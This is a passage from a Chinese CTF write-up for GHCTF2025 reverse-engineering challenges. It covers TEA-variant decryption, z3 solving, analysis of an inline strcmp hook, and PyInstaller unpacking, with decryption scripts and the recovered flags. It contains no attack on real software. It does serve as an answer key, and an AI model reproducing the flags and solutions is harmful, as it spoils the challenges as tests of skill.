text"></p><p>换到Ghidra分析得到的伪代码会更简洁，可以很清楚的看出就是Tea加密，不过用重复计算和不同的sum值来代替了循环加密。</p><p>将第二次计算的bc46effe减去5e2377ff会发现结果还是5e2377ff，所以可以知道5e2377ff就是delta值，那么这就是一个完整的从delta值开始的Tea加密。</p><p>并且两两计算为一组，可以看出是8轮加密的Tea，并且最后将加密完的值再异或上了0xf。</p><p><img src="/2025/03/06/GHCTF2025WP/7.png" alt="alt text"></p><p>直接断点该处获得Key，进行8轮的Tea解密即可得到Flag。</p><p><img src="/2025/03/06/GHCTF2025WP/8.png" alt="alt text"></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_decrypt</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0x5E2377FF</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x5E2377FF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> Key[] =</span><br><span class="line">&#123;</span><br><span class="line">        <span class="number">0x2D</span>,<span class="number">0xF7</span>,<span class="number">0x3D</span>,<span class="number">0x42</span>,<span class="number">0x01</span>,<span class="number">0x9A</span>,<span class="number">0xF5</span>,<span class="number">0x05</span>,<span class="number">0x1D</span>,<span class="number">0xCF</span>,<span class="number">0x3F</span>,<span class="number">0x63</span>,<span class="number">0x22</span>,<span class="number">0x91</span>,<span class="number">0xD1</span>,<span class="number">0x77</span></span><br><span class="line">&#125;; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> EncFlag[] = &#123; </span><br><span class="line">    <span class="number">0xDC</span>,<span class="number">0x45</span>,<span class="number">0x1E</span>,<span class="number">0x03</span>,<span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0xE9</span>,<span class="number">0x76</span>,<span class="number">0x27</span>,<span class="number">0x47</span>,<span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x23</span>,<span class="number">0x01</span>,<span class="number">0x70</span>,<span class="number">0xD2</span>,<span class="number">0xCE</span>,</span><br><span class="line">    <span class="number">0x64</span>,<span class="number">0xDA</span>,<span class="number">0x7F</span>,<span class="number">0x46</span>,<span class="number">0x33</span>,</span><br><span class="line">    <span class="number">0xB1</span>,<span class="number">0x03</span>,<span class="number">0x49</span>,<span class="number">0xA3</span>,<span class="number">0x27</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0xD1</span>,<span class="number">0x2C</span>,<span class="number">0x37</span>,<span class="number">0xB3</span>,</span><br><span class="line">    <span class="number">0xBD</span>,<span class="number">0x75</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(EncFlag + i * <span class="number">8</span>) ^= <span class="number">0xf</span>;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(EncFlag + i * <span class="number">8</span> + <span class="number">4</span>) ^= <span class="number">0xf</span>;</span><br><span class="line">        <span class="built_in">tea_decrypt</span>((<span class="type">uint32_t</span>*)(EncFlag + i * <span class="number">8</span>), (<span class="type">uint32_t</span>*)Key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>,EncFlag);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值-1"><a href="#Flag值-1" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;!!!Y0u_g3t_th3_s3cr3t!!!&#125;</code></p><h2 id="FishingKit"><a href="#FishingKit" class="headerlink" title="FishingKit"></a>FishingKit</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>结合题目描述可以知道这题的考点是Hook。</p><p>首先程序要求输入bait数据，进行一个计算检验，这部分直接用z3就可以解出目标数据。</p><p><img src="/2025/03/06/GHCTF2025WP/9.png" alt="alt text"></p><p>z3代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">a0,a1,a2,a3,a4,a5,a6,a7,a8,a9 = BitVecs(<span class="string">&quot;a0 a1 a2 a3 a4 a5 a6 a7 a8 a9&quot;</span>,<span class="number">12</span>) </span><br><span class="line"></span><br><span class="line">s.add(<span class="number">202</span> * a8 + <span class="number">216</span> * a5 - <span class="number">4</span> * a4 - <span class="number">330</span> * a9 - <span class="number">13</span> * a4 - <span class="number">268</span> * a6 == -<span class="number">14982</span>)</span><br><span class="line">s.add(<span class="number">325</span> * a8 + <span class="number">195</span> * a0 + <span class="number">229</span> * a1 - <span class="number">121</span> * a6 - <span class="number">409</span> * a6 - (a1 &lt;&lt; <span class="number">7</span>) == <span class="number">22606</span>)</span><br><span class="line">s.add(<span class="number">489</span> * a1 + <span class="number">480</span> * a6 + <span class="number">105</span> * a2 + <span class="number">367</span> * a3 - <span class="number">135</span> * a4 - <span class="number">482</span> * a9 == <span class="number">63236</span>)</span><br><span class="line">s.add(<span class="number">493</span> * a1 - <span class="number">80</span> * a4 - <span class="number">253</span> * a8 - <span class="number">121</span> * a2 - <span class="number">177</span> * a0 - <span class="number">243</span> * a9 == -<span class="number">39664</span>)</span><br><span class="line">s.add(<span class="number">275</span> * a4 + <span class="number">271</span> * a6 + <span class="number">473</span> * a7 - <span class="number">72</span> * a5 - <span class="number">260</span> * a4 - <span class="number">367</span> * a4 == <span class="number">14255</span>)</span><br><span class="line">s.add(<span class="number">286</span> * a0 + <span class="number">196</span> * a7 + <span class="number">483</span> * a2 + <span class="number">442</span> * a1 - <span class="number">495</span> * a8 - <span class="number">351</span> * a4 == <span class="number">41171</span>)</span><br><span class="line">s.add(<span class="number">212</span> * a2 + <span class="number">283</span> * a7 - <span class="number">329</span> * a8 - <span class="number">429</span> * a9 - <span class="number">362</span> * a2 - <span class="number">261</span> * a6 == -<span class="number">90284</span>)</span><br><span class="line">s.add(<span class="number">456</span> * a5 + <span class="number">244</span> * a7 + <span class="number">92</span> * a4 + <span class="number">348</span> * a7 - <span class="number">225</span> * a1 - <span class="number">31</span> * a2 == <span class="number">88447</span>)</span><br><span class="line">s.add(<span class="number">238</span> * a9 + <span class="number">278</span> * a7 + <span class="number">216</span> * a6 + <span class="number">237</span> * a0 + <span class="number">8</span> * a2 - <span class="number">17</span> * a9 == <span class="number">83838</span>)</span><br><span class="line">s.add(<span class="number">323</span> * a9 + <span class="number">121</span> * a1 + <span class="number">370</span> * a7 - (a4 &lt;&lt; <span class="number">6</span>) - <span class="number">196</span> * a9 - <span class="number">422</span> * a0 == <span class="number">26467</span>)</span><br><span class="line">s.add(<span class="number">166</span> * a9 + <span class="number">90</span> * a1 + <span class="number">499</span> * a2 + <span class="number">301</span> * a8 - <span class="number">31</span> * a2 - <span class="number">206</span> * a2 == <span class="number">88247</span>)</span><br><span class="line">s.add(<span class="number">355</span> * a0 + <span class="number">282</span> * a4 + <span class="number">44</span> * a9 + <span class="number">359</span> * a8 - <span class="number">167</span> * a5 - <span class="number">62</span> * a3 == <span class="number">76658</span>)</span><br><span class="line">s.add(<span class="number">488</span> * a6 + <span class="number">379</span> * a9 + <span class="number">318</span> * a2 - <span class="number">85</span> * a1 - <span class="number">357</span> * a2 - <span class="number">277</span> * a5 == <span class="number">35398</span>)</span><br><span class="line">s.add(<span class="number">40</span> * a0 + <span class="number">281</span> * a4 + <span class="number">217</span> * a5 - <span class="number">241</span> * a1 - <span class="number">407</span> * a7 - <span class="number">309</span> * a7 == -<span class="number">35436</span>)</span><br><span class="line">s.add(<span class="number">429</span> * a3 + <span class="number">441</span> * a3 + <span class="number">115</span> * a1 + <span class="number">96</span> * a8 + <span class="number">464</span> * a1 - <span class="number">133</span> * a7 == <span class="number">157448</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    ans = s.model() </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="string">f&quot;<span class="subst">&#123;ans[<span class="built_in">eval</span>(<span class="string">f&#x27;a<span class="subst">&#123;i&#125;</span>&#x27;</span>)]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(t),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到<strong>DeluxeBait</strong>字串</p><p>然后下面部分有个加密函数，可以看出是魔改RC4，加密完与一个数组进行比对，这边解密后会得到假Flag，有兴趣的可以自己解密试试。</p><p><img src="/2025/03/06/GHCTF2025WP/10.png" alt="alt text"></p><p>由于知道是Hook考点，直接字符串搜索VirtualProtect，定位，查找交叉引用，发现有一个函数有调用。</p><p><img src="/2025/03/06/GHCTF2025WP/11.png" alt="alt text"></p><p>可以看出这部分就是Hook代码，上面的0xff,0x25就是far jmp的汇编，参数一传进来要Hook的函数，参数二是自己的函数。</p><p><img src="/2025/03/06/GHCTF2025WP/12.png" alt="alt text"></p><p>在他的调用上层就可以看到获取了模块和函数地址，不过做了异或加密处理，sub_140001CE0就是Hook函数要跳转执行的函数。</p><p><img src="/2025/03/06/GHCTF2025WP/13.png" alt="alt text"></p><p>可以解密出来是strcmp，也就是对strcmp做了Hook，之前在主函数有看到strcmp，就是那里程序发生了跳转，没有执行真实的strcmp。</p><p><img src="/2025/03/06/GHCTF2025WP/14.png" alt="alt text"></p><p>所以接下来重点分析sub_140001CE0函数。可以看到这边是对数据进行了24轮Tea加密，最后与byte_1400063C8数组进行比对，那么byte_1400063C8就是真实被加密的Flag。</p><p><img src="/2025/03/06/GHCTF2025WP/15.png" alt="alt text"></p><p>这边重点就是传入的buf和buf_1数据实际是什么，可以在赋这两个数组赋值完后处进行断点，查看实际数据。</p><p>可以发现实际上就是DeluxeBait字串以及输入的Flag值。</p><p><img src="/2025/03/06/GHCTF2025WP/16.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/17.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/18.png" alt="alt text"></p><p>由于buf数组在开头已经memset 0了，赋值的字串”DeluxeBait”长度仅有10，而Tea加密要的Key必须是16字节，所以最终进行加密的Key是这个字串加上6个0x00。</p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x66778899</span>, sum = delta * <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> EncFlag[<span class="number">24</span>]&#123;&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(EncFlag, <span class="string">&quot;!V&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    EncFlag[<span class="number">2</span>] = <span class="number">-105</span>;</span><br><span class="line">    EncFlag[<span class="number">3</span>] = <span class="number">-90</span>;</span><br><span class="line">    EncFlag[<span class="number">4</span>] = <span class="number">26</span>;</span><br><span class="line">    EncFlag[<span class="number">5</span>] = <span class="number">-43</span>;</span><br><span class="line">    EncFlag[<span class="number">6</span>] = <span class="number">-60</span>;</span><br><span class="line">    EncFlag[<span class="number">7</span>] = <span class="number">-34</span>;</span><br><span class="line">    EncFlag[<span class="number">8</span>] = <span class="number">-92</span>;</span><br><span class="line">    EncFlag[<span class="number">9</span>] = <span class="number">-100</span>;</span><br><span class="line">    EncFlag[<span class="number">10</span>] = <span class="number">-126</span>;</span><br><span class="line">    EncFlag[<span class="number">11</span>] = <span class="number">77</span>;</span><br><span class="line">    EncFlag[<span class="number">12</span>] = <span class="number">-47</span>;</span><br><span class="line">    EncFlag[<span class="number">13</span>] = <span class="number">69</span>;</span><br><span class="line">    EncFlag[<span class="number">14</span>] = <span class="number">-56</span>;</span><br><span class="line">    EncFlag[<span class="number">15</span>] = <span class="number">86</span>;</span><br><span class="line">    EncFlag[<span class="number">16</span>] = <span class="number">-89</span>;</span><br><span class="line">    EncFlag[<span class="number">17</span>] = <span class="number">-76</span>;</span><br><span class="line">    EncFlag[<span class="number">18</span>] = <span class="number">-106</span>;</span><br><span class="line">    EncFlag[<span class="number">19</span>] = <span class="number">92</span>;</span><br><span class="line">    EncFlag[<span class="number">20</span>] = <span class="number">77</span>;</span><br><span class="line">    EncFlag[<span class="number">21</span>] = <span class="number">73</span>;</span><br><span class="line">    EncFlag[<span class="number">22</span>] = <span class="number">-121</span>;</span><br><span class="line">    EncFlag[<span class="number">23</span>] = <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> Key[] = <span class="string">&quot;DeluxeBait\0\0\0\0\0\0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span>*)(EncFlag), (<span class="type">uint32_t</span>*)Key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span>*)(EncFlag + <span class="number">8</span>), (<span class="type">uint32_t</span>*)Key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span>*)(EncFlag + <span class="number">16</span>), (<span class="type">uint32_t</span>*)Key);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.23s\n&quot;</span>, EncFlag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值-2"><a href="#Flag值-2" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;Wh@t_@_b1g_F1sh&#125;</code></p><h2 id="Mio？Ryo？Soyo？"><a href="#Mio？Ryo？Soyo？" class="headerlink" title="Mio？Ryo？Soyo？"></a>Mio？Ryo？Soyo？</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>第二批题目的签到题，常规的Python程序解包。</p><p>使用pyinstxtractor进行解包，需要对应程序python版本，使用python3.8运行，否则无法解压pyz文件得到Secret.pyc。</p><p><img src="/2025/03/06/GHCTF2025WP/19.png" alt="alt text"></p><p>使用uncompyle6进行pyc反编译program.pyc可以看到源码。发现引入了Secret文件，可以在PYZ-00.pyz_extracted找到对应pyc文件，同样使用uncompyle6得到源码。</p><p><img src="/2025/03/06/GHCTF2025WP/20.png" alt="alt text"></p><p>发现引入了SecretEncrypt文件，并且这边有program.py里看到被调用比对的数据，大概率就是被加密的Flag。</p><p><img src="/2025/03/06/GHCTF2025WP/21.png" alt="alt text"></p><p>反编译得到SecretEncrypt代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MMMMiiiiiio</span>:</span><br><span class="line">    MMiiiiiiooo = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(Miiooooooooo) <span class="keyword">for</span> Miiooooooooo <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">118</span>)])</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">MMMMiiooooooo</span>(<span class="params">MMMMMMMMMiiiooo: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        MMMMiiiiioooooooooo = <span class="string">&quot;&quot;</span></span><br><span class="line">        MMMMMMMiiiiioo = (<span class="number">4</span> - <span class="built_in">len</span>(MMMMMMMMMiiiooo) % <span class="number">4</span>) % <span class="number">4</span></span><br><span class="line">        MMMMMMMMMiiiooo += <span class="string">b&#x27;\x00&#x27;</span> * MMMMMMMiiiiioo</span><br><span class="line">        <span class="keyword">for</span> MMMMMMiiiiiio <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(MMMMMMMMMiiiooo), <span class="number">4</span>):</span><br><span class="line">            MMMMiiiiiiooooo = MMMMMMMMMiiiooo[MMMMMMiiiiiio[:MMMMMMiiiiiio + <span class="number">4</span>]]</span><br><span class="line">            MMMMMMiiioooooo = <span class="built_in">int</span>.from_bytes(MMMMiiiiiiooooo, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">            MMMMMMMiiooooooooo = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                MMMMMMMiiooooooooo = MMMMiiiiiio.MMiiiiiiooo[MMMMMMiiioooooo % <span class="number">85</span>] + MMMMMMMiiooooooooo</span><br><span class="line">                MMMMMMiiioooooo //= <span class="number">85</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                MMMMiiiiioooooooooo += MMMMMMMiiooooooooo</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> MMMMMMMiiiiioo:</span><br><span class="line">                MMMMiiiiioooooooooo = MMMMiiiiioooooooooo[<span class="literal">None</span>[:-MMMMMMMiiiiioo]]</span><br><span class="line">            <span class="keyword">return</span> MMMMiiiiioooooooooo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RRRRyyooo</span>:</span><br><span class="line">    RRRRyooooooo = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(RRRRRRRyyyyyoooo) <span class="keyword">for</span> RRRRRRRyyyyyoooo <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">93</span>)])</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">RRRRRRRyyyyooooo</span>(<span class="params">RRRRRRyyyoooooo: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        RRRRyyyyyooo = []</span><br><span class="line">        RRyyyyyyyyyoooooo = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> RRyyyyyyyyyoooooo &lt; <span class="built_in">len</span>(RRRRRRyyyoooooo):</span><br><span class="line">            <span class="keyword">if</span> RRyyyyyyyyyoooooo + <span class="number">1</span> &lt; <span class="built_in">len</span>(RRRRRRyyyoooooo):</span><br><span class="line">                RRRRRRRRRyyo = RRRRRRyyyoooooo[RRyyyyyyyyyoooooo] &lt;&lt; <span class="number">8</span> | RRRRRRyyyoooooo[RRyyyyyyyyyoooooo + <span class="number">1</span>]</span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo % <span class="number">45</span>])</span><br><span class="line">                RRRRRRRRRyyo //= <span class="number">45</span></span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo % <span class="number">45</span>])</span><br><span class="line">                RRRRRRRRRyyo //= <span class="number">45</span></span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo])</span><br><span class="line">                RRyyyyyyyyyoooooo += <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                RRRRRRRRRyyo = RRRRRRyyyoooooo[RRyyyyyyyyyoooooo]</span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo % <span class="number">45</span>])</span><br><span class="line">                RRRRRRRRRyyo //= <span class="number">45</span></span><br><span class="line">                RRRRyyyyyooo.append(RRRRyyooo.RRRRyooooooo[RRRRRRRRRyyo])</span><br><span class="line">                RRyyyyyyyyyoooooo += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(RRRRyyyyyooo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SSSooooyyooo</span>(<span class="params">SSSSooyoooooo, SSSSSoyyooooo</span>):</span><br><span class="line">    SSoooooyyyyyyoo = []</span><br><span class="line">    <span class="keyword">for</span> SSSSSSSSSoyooo <span class="keyword">in</span> SSSSooyoooooo:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;a&quot;</span> &lt;= SSSSSSSSSoyooo &lt;= <span class="string">&quot;z&quot;</span>:</span><br><span class="line">            SSSSoooyooooooo = (<span class="built_in">ord</span>(SSSSSSSSSoyooo) - <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) + SSSSSoyyooooo) % <span class="number">26</span></span><br><span class="line">            SSoooooyyyyyyoo.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) + SSSSoooyooooooo))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;0&quot;</span> &lt;= SSSSSSSSSoyooo &lt;= <span class="string">&quot;9&quot;</span>:</span><br><span class="line">            SSSSoooyooooooo = (<span class="built_in">ord</span>(SSSSSSSSSoyooo) - <span class="built_in">ord</span>(<span class="string">&quot;0&quot;</span>) - SSSSSoyyooooo) % <span class="number">10</span></span><br><span class="line">            SSoooooyyyyyyoo.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;0&quot;</span>) + SSSSoooyooooooo))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            SSoooooyyyyyyoo.append(SSSSSSSSSoyooo)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(SSoooooyyyyyyoo)</span><br></pre></td></tr></table></figure><p>可以看出第一个是标准Base85加密，第二个是Base45加密，但是和标准的表不一样，第三个是经典的凯撒加密。</p><p>这部分就是Base45实际用到的表。</p><p><code>TABLE = &quot;&quot;.join([chr(i) for i in range(48, 93)])</code></p><p>编写三个加密的解密函数，按Secret文件的代码对Enc数据进行按顺序调用解密即可得到Flag。</p><p>解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 